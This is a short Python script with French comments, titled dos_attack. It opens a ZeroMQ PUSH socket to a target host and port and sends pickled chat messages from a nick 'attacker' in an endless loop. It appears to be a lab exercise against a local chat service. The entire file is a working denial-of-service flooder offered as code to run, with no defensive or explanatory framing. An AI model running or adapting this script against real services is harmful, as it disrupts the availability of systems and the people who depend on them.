import zmq
import pickle
import time

def dos_attack(target="localhost", port=6666):
    context = zmq.Context()
    socket = context.socket(zmq.PUSH)  # Changer de REQ à PUSH pour ne pas attendre de réponse
    socket.connect(f"tcp://{target}:{port}")

    # Attente pour assurer la connexion avant d'envoyer des messages
    time.sleep(1)
    print("Connexion établie.")

    # Boucle infinie pour envoyer des requêtes en continu
    while True:
        try:
            # Envoyer une requête (peut être un message vide ou un message mal formé)
            socket.send(pickle.dumps({"type": "message", "nick": "attacker", "message": "DoS Attack!"}))
            print("Message envoyé.")
            time.sleep(0.1)  # Attente pour ne pas surcharger immédiatement
        except zmq.ZMQError as e:
            print(f"Erreur ZMQ: {e}")
            break

if __name__ == "__main__":
    dos_attack()
